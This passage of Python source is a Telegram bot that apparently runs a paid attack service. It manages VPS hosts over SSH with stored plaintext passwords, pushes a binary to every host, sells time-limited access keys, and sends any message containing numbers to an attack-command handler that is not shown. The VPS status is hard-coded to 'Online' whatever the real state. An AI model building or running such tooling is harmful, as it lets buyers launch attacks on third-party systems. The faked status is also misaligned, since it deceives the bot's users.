        if selection_num == 0:
            bot.send_message(
                chat_id,
                "🚫 *VPS removal cancelled!*",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
            return
            
        if selection_num < 1 or selection_num > len(vps_list):
            raise ValueError("Invalid selection")
            
        selected_ip, selected_details = vps_list[selection_num - 1]
        
        confirm_msg = (
            f"⚠️ *CONFIRM VPS REMOVAL* ⚠️\n"
            f"┌──────────────────────────────┐\n"
            f"│  🖥️ *VPS #{selection_num} DETAILS*  │\n"
            f"├──────────────────────────────┤\n"
            f"│ 🌐 *IP:* `{selected_ip}`\n"
            f"│ 👤 *User:* `{selected_details['username']}`\n"
            f"│ 📅 *Added:* `{datetime.fromisoformat(selected_details['added_at']).strftime('%d %b %Y %H:%M')}`\n"
            f"└──────────────────────────────┘\n\n"
            f"❗ *This action cannot be undone!*\n\n"
            f"🔴 Type *'CONFIRM'* to proceed\n"
            f"🟢 Type anything else to cancel"
        )
        
        msg = bot.send_message(
            chat_id,
            confirm_msg,
            parse_mode='Markdown'
        )
        
        bot.register_next_step_handler(msg, confirm_vps_removal, selected_ip)
        
    except ValueError:
        bot.send_message(
            chat_id,
            f"❌ *Invalid selection!*\nPlease enter a number between 1-{len(vps_list)} or 0 to cancel.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

def confirm_vps_removal(message, ip_to_remove):
    chat_id = message.chat.id
    user_id = message.from_user.id
    confirmation = message.text.strip().upper()
    
    if confirmation == "CONFIRM":
        vps_data = load_vps_data()
        
        if ip_to_remove in vps_data['vps']:
            del vps_data['vps'][ip_to_remove]
            
            if save_vps_data(vps_data):
                bot.send_message(
                    chat_id,
                    f"✅ *SUCCESS!*\n\n🖥️ VPS `{ip_to_remove}` has been *permanently removed*!",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    chat_id,
                    f"❌ *FAILED!*\n\nCould not remove VPS `{ip_to_remove}`. Please try again.",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
        else:
            bot.send_message(
                chat_id,
                f"🤔 *NOT FOUND!*\n\nVPS `{ip_to_remove}` doesn't exist in the system.",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
    else:
        bot.send_message(
            chat_id,
            "🟢 *Operation cancelled!*\n\nNo VPS were removed.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List VPS" and is_owner(message.from_user.id))
def list_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to list VPS.*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "*No VPS found!*", parse_mode='Markdown')
        return
    
    vps_status = {}
    for ip in vps_data['vps']:
        vps_status[ip] = {
            'status': "🟢 Online",
            'binary': "✔ Binary working"
        }
    
    online_count = sum(1 for ip in vps_status if vps_status[ip]['status'] == "🟢 Online")
    offline_count = len(vps_status) - online_count
    
    response = (
        "╔══════════════════════════╗\n"
        "║     🖥️ VPS STATUS       ║\n"
        "╠══════════════════════════╣\n"
        f"║ Online: {online_count:<15} ║\n"
        f"║ Offline: {offline_count:<14} ║\n"
        f"║ Total: {len(vps_status):<16} ║\n"
        "╚══════════════════════════╝\n\n"
        f"Bot Owner: @{message.from_user.username or 'admin'}\n\n"
    )
    
    for i, (ip, details) in enumerate(vps_data['vps'].items(), 1):
        status_info = vps_status.get(ip, {'status': '🔴 Unknown', 'binary': '✖ Status unknown'})
        
        response += (
            f"╔══════════════════════════╗\n"
            f"║ VPS {i} Status{' '*(16-len(str(i)))}║\n"
            f"╠══════════════════════════╣\n"
            f"║ {status_info['status']:<24} ║\n"
            f"║ IP: {ip:<20} ║\n"
            f"║ User: {details['username']:<18} ║\n"
            f"║ {status_info['binary']:<24} ║\n"
            f"╚══════════════════════════╝\n\n"
        )
    
    bot.send_message(
        chat_id,
        f"```\n{response}\n```",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📁 VPS Files" and is_owner(message.from_user.id))
def vps_files_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for VPS files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*VPS File Management*",
        reply_markup=get_vps_files_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📤 Upload to All" and is_owner(message.from_user.id))
def upload_to_all_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to upload files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the file you want to upload to all VPS:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_upload)

def process_file_upload(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not message.document:
        bot.send_message(
            chat_id,
            "*Please send a file to upload.*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        local_path = os.path.join(BASE_DIR, message.document.file_name)
        with open(local_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        vps_data = load_vps_data()
        success_count = 0
        failed_count = 0
        
        bot.send_message(chat_id, "*Starting file upload to all VPS...*", parse_mode='Markdown')
        
        for ip, details in vps_data['vps'].items():
            remote_path = f"/root/{message.document.file_name}"
            success, result = ssh_upload_file(
                ip, 
                details['username'], 
                details['password'], 
                local_path, 
                remote_path
            )
            
            if success:
                success_count += 1
            else:
                failed_count += 1
                logger.error(f"Failed to upload to {ip}: {result}")
        
        os.remove(local_path)
        
        bot.send_message(
            chat_id,
            f"*File upload completed!*\n\n"
            f"Success: {success_count}\n"
            f"Failed: {failed_count}",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error in file upload: {e}")
        bot.send_message(
            chat_id,
            f"*An error occurred during file upload: {str(e)}*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove from All" and is_owner(message.from_user.id))
def remove_from_all_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter the filename to remove from all VPS:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_removal)

def process_file_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    filename = message.text.strip()
    
    vps_data = load_vps_data()
    success_count = 0
    failed_count = 0
    
    bot.send_message(chat_id, "*Starting file removal from all VPS...*", parse_mode='Markdown')
    
    for ip, details in vps_data['vps'].items():
        remote_path = f"/root/{filename}"
        success, result = ssh_remove_file(
            ip,
            details['username'],
            details['password'],
            remote_path
        )
        
        if success:
            success_count += 1
        else:
            failed_count += 1
            logger.error(f"Failed to remove from {ip}: {result}")
    
    bot.send_message(
        chat_id,
        f"*File removal completed!*\n\n"
        f"Success: {success_count}\n"
        f"Failed: {failed_count}",
        reply_markup=get_vps_files_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📂 List Files" and is_owner(message.from_user.id))
def list_files_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to list files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter VPS IP to list files from:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_listing)

def process_file_listing(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    ip = message.text.strip()
    
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"*VPS {ip} not found!*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        return
    
    details = vps_data['vps'][ip]
    success, files = ssh_list_files(
        ip,
        details['username'],
        details['password'],
        "/root"
    )
    
    if success:
        response = f"*Files on {ip}:*\n\n" + "\n".join(f"{f}" for f in files)
        bot.send_message(
            chat_id,
            response,
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to list files: {files[0]}*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "👑 Owner Tools" and is_owner(message.from_user.id))
def owner_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for owner tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Owner Tools*",
        reply_markup=get_owner_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add Bot" and is_owner(message.from_user.id))
def add_bot_command(message):
    bot.send_message(message.chat.id, "Send new bot token:")
    bot.register_next_step_handler(message, process_new_bot)

def process_new_bot(message):
    token = message.text.strip()
    bots = load_active_bots()
    
    # Start new bot instance in a thread
    new_bot = telebot.TeleBot(token)
    
    # Clone all handlers (you'd need to replicate handler logic here)
    # This would require refactoring to share handlers between bots
    
    bots['bots'].append(token)
    save_active_bots(bots)
    
    # Start polling in new thread
    import threading
    t = threading.Thread(target=new_bot.infinity_polling)
    t.start()
    
    bot.send_message(message.chat.id, "New bot activated!")

@bot.message_handler(func=lambda message: message.text == "🗑 Remove Bot" and is_owner(message.from_user.id))
def remove_bot_command(message):
    bots = load_active_bots()
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for token in bots['bots']:
        markup.add(KeyboardButton(f"Remove {token}"))
    markup.add(KeyboardButton("⬅️ Main Menu"))
    bot.send_message(message.chat.id, "Select bot to remove:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text.startswith("Remove ") and is_owner(message.from_user.id))
def process_bot_removal(message):
    token = message.text[7:]
    bots = load_active_bots()
    if token in bots['bots']:
        bots['bots'].remove(token)
        save_active_bots(bots)
        # Actual bot removal would require tracking thread instances
        bot.send_message(message.chat.id, f"Bot {token} removed!")
    else:
        bot.send_message(message.chat.id, "Bot not found!")

@bot.message_handler(func=lambda message: message.text == "➕ Add Owner" and is_owner(message.from_user.id))
def add_owner_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to add owners.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as owner:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_owner_addition)

def process_owner_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_owner = message.text.strip()
    
    try:
        new_owner_id = int(new_owner)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    owner_data = load_owner_data()
    
    if new_owner_id in owner_data['owners']:
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} is already an owner!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
        return
    
    owner_data['owners'].append(new_owner_id)
    
    if save_owner_data(owner_data):
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} added as owner successfully!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add owner {new_owner_id}.*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )

def redeem_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key = message.text.strip()
    
    keys = load_keys()
    
    if key not in keys:
        bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')
        return
    
    if keys[key]['redeemed']:
        bot.send_message(chat_id, "*Key already redeemed!*", parse_mode='Markdown')
        return
    
    duration = keys[key]['duration']
    if duration == 'hour':
        expires = datetime.now() + timedelta(hours=1)
    elif duration == 'day':
        expires = datetime.now() + timedelta(days=1)
    elif duration == 'week':
        expires = datetime.now() + timedelta(weeks=1)
    else:
        expires = datetime.now()
    
    users = load_users()
    user_exists = any(u['user_id'] == user_id for u in users)
    
    if user_exists:
        for user in users:
            if user['user_id'] == user_id:
                user['key'] = key
                user['valid_until'] = expires.isoformat()
                break
    else:
        users.append({
            'user_id': user_id,
            'key': key,
            'valid_until': expires.isoformat()
        })
    
    keys[key]['redeemed'] = True
    keys[key]['redeemed_by'] = user_id
    keys[key]['redeemed_at'] = datetime.now().isoformat()
    
    if save_users(users) and save_keys(keys):
        bot.send_message(
            chat_id,
            f"*Key redeemed successfully!*\n\n"
            f"Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}",
            reply_markup=get_main_markup(user_id),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(chat_id, "*Error saving data. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text.strip()
    
    if any(part.isdigit() for part in text.split()):
        process_attack_command(message, chat_id)
        return
    
    if len(text) == 16 and text.isalnum():
        redeem_key(message)
        return
    
    bot.send_message(
        chat_id,
        "*Unknown command. Please use the buttons.*",
        reply_markup=get_main_markup(user_id),
        parse_mode='Markdown'
    )

# Start the bot
if __name__ == '__main__':
    logger.info("Starting bot...")
    keys = load_keys()
    
    try:
        bot.infinity_polling(none_stop=True, interval=1)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        time.sleep(5)